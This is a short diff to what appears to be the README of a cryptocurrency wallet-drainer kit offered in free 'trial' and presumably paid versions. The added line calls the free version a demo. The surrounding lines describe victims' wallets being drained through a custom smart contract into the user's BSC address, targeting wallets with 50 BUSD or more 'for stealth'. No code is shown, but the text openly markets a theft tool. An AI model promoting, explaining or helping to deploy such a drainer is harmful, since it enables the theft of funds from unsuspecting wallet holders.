@@ -92,6 +92,9 @@ Make sure you fork this project before doing the tutorial here is how to fork ht
 
 ### HOW IT WORKS FOR FREE VERSION ###
 
+### REMEMBER THE FREE VERSION IS ONLY MENT TO BE A TRIAL A DEMO ###
+
+
 Wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 !!!!!!!!! This only will work with wallets that have 50 busd or more for stealth !!!!!!!!!
